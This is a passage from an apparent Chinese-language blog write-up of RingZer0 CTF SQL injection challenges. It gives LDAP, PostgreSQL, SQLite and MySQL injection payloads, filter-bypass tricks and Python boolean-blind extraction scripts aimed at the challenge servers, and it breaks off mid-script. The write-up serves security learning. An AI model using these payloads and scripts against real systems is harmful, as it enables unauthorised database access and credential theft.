class="line">new=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++1&amp;new_password=123</span><br></pre></td></tr></table></figure><p>登录payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=123</span><br></pre></td></tr></table></figure><p>登录成功获得flag</p><h4 id="Just-another-login-form"><a href="#Just-another-login-form" class="headerlink" title="Just another login form"></a>Just another login form</h4><p>这题LDAP注入，LDAP简单来说类似Mysql，可以理解成一个数据库，具体可以参考<a href="https://www.fujieace.com/jingyan/ldap.html" target="_blank" rel="noopener">https://www.fujieace.com/jingyan/ldap.html</a></p><p>search语法：attribute operator value<br>search filter options:( “&amp;” or “|” (filter1) (filter2) (filter3) …) (“!” (filter))</p><p>=(等于)查找“名“属性为“John”的所有对象，可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(givenName=John)</span><br></pre></td></tr></table></figure><p>这会返回“名”属性为“John”的所有对象。圆括号是必需的，以便强调 LDAP 语句的开始和结束。</p><p>&amp;(逻辑与)如果具有多个条件并且希望全部条件都得到满足，则可使用此语法。例如，如果希望查找居住在 Dallas 并且“名”为“John”的所有人员，可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(givenName=John)(l=Dallas))</span><br></pre></td></tr></table></figure><p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 &amp; 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p><p>!(逻辑非)此操作符用来排除具有特定属性的对象。假定您需要查找“名”为“John”的对象以外的所有对象。则应使用如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(!givenName=John）</span><br></pre></td></tr></table></figure><p>此语句将查找“名”不为“John”的所有对象。请注意：! 操作符紧邻参数的前面，并且位于参数的圆括号内。由于本语句只有一个参数，因此使用圆括号将其括起以示说明</p><p>*（通配符）可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(title=*)</span><br></pre></td></tr></table></figure><p>这会返回“title”属性包含内容的所有对象。另一个例子是：您知道某个对象的“名”属性的开头两个字母是“Jo”。那么，可以使用如下语法进行查找：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(givenName=Jo*)</span><br></pre></td></tr></table></figure><p>这会返回“名”以“Jo”开头的所有对象。</p><p>高级用法eg:您需要一个筛选条件，用来查找居住在 Dallas 或 Austin，并且名为“John”的所有对象。使用的语法应当是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(givenName=John)(|(l=Dallas)(l=Austin)))</span><br></pre></td></tr></table></figure><p>所以这里LDAP注入主要利用的是通配符<code>*</code></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=*&amp;password=*</span><br></pre></td></tr></table></figure><h4 id="Po-po-po-po-postgresql"><a href="#Po-po-po-po-postgresql" class="headerlink" title="Po po po po postgresql"></a>Po po po po postgresql</h4><p>题目给了提示<strong>postgresql</strong>，经过查询是关系型数据库，<code>--+</code>代表注释</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;--+&amp;password=1</span><br></pre></td></tr></table></figure><p>出现报错信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: syntax error at end of input LINE 1: ...AND password = (&apos;da39a3ee5e6b4b0d3255bfef95601890afd80709&apos;)) ^</span><br></pre></td></tr></table></figure><p>得知需要再添加<code>))</code>闭合</p><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;))--+&amp;password=1</span><br></pre></td></tr></table></figure><h4 id="Don’t-mess-with-Noemie-she-hates-admin"><a href="#Don’t-mess-with-Noemie-she-hates-admin" class="headerlink" title="Don’t mess with Noemie; she hates admin!"></a>Don’t mess with Noemie; she hates admin!</h4><p>题目给出了用户名不是admin，并且同样过滤注释符<code>#</code>和<code>--</code>和<code>/*</code></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; or 1 or &apos;&amp;password=1</span><br></pre></td></tr></table></figure><p>即使admin不存在，但是经过<code>or 1</code>之后最终结果也是1</p><h4 id="What’s-the-definition-of-NULL"><a href="#What’s-the-definition-of-NULL" class="headerlink" title="What’s the definition of NULL"></a>What’s the definition of NULL</h4><p>sqlite注入，以下为sqlite简介：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLite的，是一款轻型的数据库。sqlite存在一个叫SQLITE_MASTER的表，这与MySQL5.x的INFORMATION_SCHEMA表类似。sqlite_master 表中保存了数据库中所有表的信息，该表中比较有用的字段有“name,sql”，name字段存放的是表名，sql字段存放的是表结构。可以通过内置函数sqlite_version()获取版本信息，和其他数据库一样，通过“order by”判断长度，该数据库的注释符和ORACLE数据库一样，都是–。</span><br></pre></td></tr></table></figure><p>题目注入点为GET方式传入的参数<code>id</code>，并且传入的值经过base64解密</p><p>题目给出的hint：<code>WHERE (id IS NOT NULL) AND (ID = ? AND display = 1)</code></p><p>猜测后台sql语句为<code>WHERE (id IS NOT NULL) AND (ID = base64_decode($_GET[&#39;id&#39;]) AND display = 1)</code></p><p>获得查询列数payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) order by 3--</span><br></pre></td></tr></table></figure><p>查询列数为3</p><p>获得表名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) union select group_concat(name),2,3 from sqlite_master--</span><br></pre></td></tr></table></figure><p>表名为：<code>flag</code></p><p>获得表结构payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) union select group_concat(sql),2,3 from sqlite_master--</span><br></pre></td></tr></table></figure><p>结构：<code>CREATE TABLE flag (content varchar(100), display int(1), id int(10))</code>                </p><p>获得flag payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0) union select content,2,3 from sqlite_master--</span><br></pre></td></tr></table></figure><h4 id="Login-portal-2"><a href="#Login-portal-2" class="headerlink" title="Login portal 2"></a>Login portal 2</h4><p>同样试一下<code>username=admin&#39;#&amp;password=</code>，返回<code>Wrong username / password.</code>看样子，注释符好像没有被过滤，因为按照前面几关套路，如果过滤提示的是非法字符，那么既然没过滤注释符的话，那就说明用户名<code>admin</code>不存在，那么老套路<code>username=admin&#39; or 1 or &#39;</code>，返回<code>Wrong password for impossibletoguess.</code></p><p>看样子，像是有对我们输入的参数<code>password</code>和查询结果的<code>password</code>进行对比检查，而弹出的<code>impossibletoguess</code>似乎就是用户名字段</p><p>验证一下猜想，试一下<code>username=admin&#39; union select 1,2#</code>，返回<code>Wrong password for 1.</code></p><p>说明第一个字段为用户名字段，既然有回显信息，那么我们就可以很好的利用联合查询</p><p>爆表payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#&amp;password=</span><br></pre></td></tr></table></figure><p>表名：<code>users</code></p><p>爆列payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(column_name),2 from information_schema.columns where table_name=&apos;users&apos;#&amp;password=</span><br></pre></td></tr></table></figure><p>列名：<code>username,password</code></p><p>爆用户名<code>impossibletoguess</code>的密码payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select group_concat(password),2 from users#&amp;password=</span><br></pre></td></tr></table></figure><p>密码：<code>1b2f190ad705d7c2afcac45447a31b053fada0c4</code></p><p>直接输入用户名和密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=impossibletoguess&amp;password=1b2f190ad705d7c2afcac45447a31b053fada0c4</span><br></pre></td></tr></table></figure><p>登录失败，看来密码是经过加密的</p><p>长度为40的密码，看样子不像是md5加密，所以猜测是<strong>sha1</strong>加密</p><p>所以后台对比的可能是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password == sha1($_POST[&apos;password&apos;])</span><br></pre></td></tr></table></figure><p>所以我们只需要通过联合注入，将第二个字段（密码字段）为<code>$_POST[&#39;password&#39;]</code>经过<strong>sha1</strong>加密后的值即可</p><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; union select 1,sha1(1000)#&amp;password=1000</span><br></pre></td></tr></table></figure><p>这题出的挺有意思的，收获挺大</p><h4 id="Generate-random-quote"><a href="#Generate-random-quote" class="headerlink" title="Generate random quote"></a>Generate random quote</h4><p>注入点为GET方式提交的参数<code>q</code></p><p>测试：<code>?q=1&#39;%23</code>无查询结果，<code>?q=1%23</code>，有查询结果，说明参数<code>q</code>无引号包裹，另外过滤了空格，用<code>/**/</code>代替即可</p><p>爆列数payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=1/**/order/**/by/**/2%23</span><br></pre></td></tr></table></figure><p>列数为2</p><p>爆表名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=1q=0/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23</span><br></pre></td></tr></table></figure><p>表名：<code>alkdjf4iu,quotes</code></p><p>爆列名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=0/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x616c6b646a66346975%23</span><br></pre></td></tr></table></figure><p>这里<code>table_name</code>字段加上单引号查询不到结果，猜测单引号被转义了，所以转为十六进制</p><p>列名：<code>id,flag</code></p><p>爆flag payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?q=0/**/union/**/select/**/1,flag/**/from/**/alkdjf4iu%23</span><br></pre></td></tr></table></figure><h4 id="Thinking-outside-the-box-is-the-key"><a href="#Thinking-outside-the-box-is-the-key" class="headerlink" title="Thinking outside the box is the key"></a>Thinking outside the box is the key</h4><p>测试<code>?id=1&#39;%23</code>和<code>?id=1%23</code>，返回信息<code>SQLite Database error please try again later.</code></p><p>看出这是一个<strong>SQLite</strong>数据库，所以注释符是<code>--</code></p><p>测试<code>?id=1--</code>，正确返回信息，说明参数<code>id</code>无引号包裹</p><p>爆列数payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0 order by 2--</span><br></pre></td></tr></table></figure><p>查询列数为2</p><p>爆表名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(name)%20from%20sqlite_master--</span><br></pre></td></tr></table></figure><p>表名：<code>random_stuff,ajklshfajks,troll,aatroll</code></p><p>爆三个表分别的结构payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,group_concat(sql)%20from%20sqlite_master--</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE random_stuff (id int(10), content varchar(100)),CREATE TABLE ajklshfajks (flag varchar(40)),CREATE TABLE troll (id int(10)),CREATE TABLE aatroll (id int(10))</span><br></pre></td></tr></table></figure><p>发现<code>flag</code>在表<code>ajklshfajks</code>中</p><p>爆flag payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%20union%20select%201,flag%20from%20ajklshfajks--</span><br></pre></td></tr></table></figure><h4 id="No-more-hacking-for-me"><a href="#No-more-hacking-for-me" class="headerlink" title="No more hacking for me!"></a>No more hacking for me!</h4><p>题目源代码给出了提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- urldecode(addslashes(str_replace(&quot;&apos;&quot;, &quot;&quot;, urldecode(htmlspecialchars($_GET[&apos;id&apos;], ENT_QUOTES))))) --&gt;</span><br></pre></td></tr></table></figure><p>我们可以发现对<code>$_GET[&#39;id&#39;]</code>进行了两次URL解码，再加上浏览器本身就进行一次解码，所以我们可以对参数<code>id</code>进行URL三次编码，就可以绕过对单引号<code>&#39;</code>的过滤</p><p>爆列数payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1%252527%252520order%252520by%2525203--</span><br><span class="line">plain: 1&apos; order by 3--</span><br></pre></td></tr></table></figure><p>列数为3</p><p>爆表名payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0%252527%252520union%252520select%2525201%25252Cgroup_concat%252528name%252529%25252C3%252520from%252520sqlite_master--</span><br><span class="line">plain: 0&apos; union select 1,group_concat(name),3 from sqlite_master--</span><br></pre></td></tr></table></figure><p>表名：<code>random_data</code></p><p>爆表结构payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0%252527%252520union%252520select%2525201%25252Cgroup_concat%252528sql%252529%25252C3%252520from%252520sqlite_master--</span><br><span class="line">plain: 0&apos; union select 1,group_concat(sql),3 from sqlite_master--</span><br></pre></td></tr></table></figure><p>结构：<code>CREATE TABLE random_data (id int, message varchar(50), display int)</code></p><p>爆flag payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0%252527%252520union%252520select%2525201%25252Cgroup_concat%252528message%252529%25252C3%252520from%252520random_data--</span><br><span class="line">plain: 0&apos; union select 1,group_concat(message),3 from random_data--</span><br></pre></td></tr></table></figure><h4 id="Don’t-Stumble-in-the-Process"><a href="#Don’t-Stumble-in-the-Process" class="headerlink" title="Don’t Stumble in the Process"></a>Don’t Stumble in the Process</h4><p>这题链接到了别的网站，注入点在GET方式传入的参数<code>id</code>，测试发现过滤了关键字<code>union,sleep</code>,并且没有报错信息，测试<code>if</code>未被过滤，所以根据有无返回结果进行基于布尔型的盲注</p><p>py脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://challenges.ringzer0team.com:10291?id="</span></span><br><span class="line">right = <span class="string">"The beautiful goat will be forsaken. In the city of the mountain, a goat of the mountain will rise. The goat of the day will court the count of war."</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">ID = <span class="string">""</span></span><br><span class="line">quote = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注数据库名:sqli291_2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"1 and if(ascii(substr(database(),%d,1))=%d,1,0)"</span>%(i,j)</span><br><span class="line">        r_url = url + payload</span><br><span class="line">        print(r_url)</span><br><span class="line">        r = requests.get(r_url) </span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            print(database)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">126</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"database:"</span>,database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#注表名:prophecies</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,0)"</span>%(i,j)</span><br><span class="line">        r_url = url + payload</span><br><span class="line">        print(r_url)</span><br><span class="line">        r = requests.get(r_url) </span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            table_name = table_name + chr(j)</span><br><span class="line">            print(table_name)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">126</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">print(<span class="string">"table_name:"</span>,table_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#注列名:id,quote</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='prophecies'),%d,1))=%d,1,0)"</span>%(i,j)</span><br><span class="line">        r_url = url + payload</span><br><span class="line">        print(r_url)</span><br><span class="line">        r = requests.get(r_url) </span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            column_name = column_name + chr(j)</span><br><span class="line">            print(column_name)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">126</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">print(<span class="string">"column_name:"</span>,column_name)</span><br></pre></td></tr></table></figure><p>但是这题没有注出flag</p><h4 id="Generate-random-quote-again"><a href="#Generate-random-quote-again" class="headerlink" title="Generate random quote again"></a>Generate random quote again</h4><p>源代码给出了提示<code>&lt;!-- &lt;input type=&quot;hidden&quot; name=&quot;debug&quot; value=&quot;false&quot; /&gt; --&gt;</code></p><p>但是一开始这题还是毫无头绪，测试<code>&#39;</code>都无法出现报错，猜不出两个参数<code>q</code>和<code>s</code>分别的作用</p><p>看到别人的提示才知道，原来后台的SQL语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> quote <span class="keyword">FROM</span> quotes <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">'htmlspecialchars($id)'</span> <span class="keyword">AND</span> <span class="keyword">LENGTH</span>(quote) &lt; <span class="keyword">CAST</span>(<span class="string">'$s'</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)</span><br></pre></td></tr></table></figure><p>题目给出的参数<code>debug</code>如果设置为<code>true</code>，则可以出现SQL语法报错</p><p>由于<code>htmlspecialchars</code>函数，导致单引号会被转化为html实体，而<code>\</code>是不会被转化的，所以当<code>$id=1\</code>时，SQL语句就变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT quote FROM quotes WHERE id = &apos;1\&apos; AND LENGTH(quote) &lt; CAST(&apos;$s&apos; AS INT)</span><br></pre></td></tr></table></figure><p>相当于查询字段<code>id</code>值为<code>1\&#39; AND LENGTH(quote) &lt; CAST(</code>，即查询<code>id=1</code></p><p>而我们在通过<code>%23</code>注释掉<code>$s</code>后面的语句，就可以直接进行联合注入，另外这里<code>union</code>需要双写</p><p>注表payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=0\&amp;s=uunionnion%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br></pre></td></tr></table></figure><p>表名：<code>qdyk5,quotes</code> </p><p>注列payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=0\&amp;s=uunionnion%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7164796b35%23</span><br></pre></td></tr></table></figure><p>列名：<code>id,flag</code></p><p>注flag payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=0\&amp;s=uunionnion%20select%201,flag%20from%20qdyk5%23</span><br></pre></td></tr></table></figure><h4 id="Login-portal-3"><a href="#Login-portal-3" class="headerlink" title="Login portal 3"></a>Login portal 3</h4><p>测试当用户名存在，密码错误时提示<code>Invalid username / password.</code>，用户名不存在时提示<code>No user found.</code></p><p>测试用户名：<code>admin&#39;%23</code>，提示<code>No user found.</code>，猜测注释符<code>#</code>被过滤了，再尝试<code>admin&#39; or &#39;1</code>，提示<code>Invalid username / password.</code></p><p>因为没有回显信息，所以无法使用联合注入，加上<code>sleep</code>也被过滤了，所以这关只能采用<strong>基于布尔型的盲注</strong>，根据提示信息来判断</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and if(ascii(substr(database(),1,1))=100,1,0) or &apos;&amp;password=123</span><br></pre></td></tr></table></figure><p>脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://ringzer0ctf.com/challenges/5"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7'</span></span><br><span class="line">    &#125;</span><br><span class="line">right = <span class="string">"Invalid username / password."</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        print(<span class="string">'checking'</span>,chr(j))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin' and if(ascii(substr((select password from users),%d,1))=%d,1,0) or '"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">122</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password:"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="comment">#password: SQL1nj3ct10nFTW</span></span><br></pre></td></tr></table></figure><p>登录成功后获得flag</p><h4 id="Lite-login-portal"><a href="#Lite-login-portal" class="headerlink" title="Lite login portal"></a>Lite login portal</h4><p>这题用户名存在和不存在时回显的信息跟上一关一样，不过多了个报错信息，测试<code>admin&#39;</code>时得到报错信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLite Database error please try again later. Impossible to fetch username &amp; password from users table</span><br></pre></td></tr></table></figure><p>直接得知了表名<code>users</code>和字段名<code>username,password</code></p><p>测试<code>admin&#39; or &#39;1</code>，回显<code>Invalid username / password.</code></p><p>同样跟上一关一样用布尔盲注，不过这里是SQLite数据库，payload略有不同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and substr(,1,1)=&apos;a&apos; or &apos;&amp;password=123</span><br></pre></td></tr></table></figure><p>脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://ringzer0ctf.com/challenges/19"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7'</span></span><br><span class="line">    &#125;</span><br><span class="line">right = <span class="string">"Invalid username / password."</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j 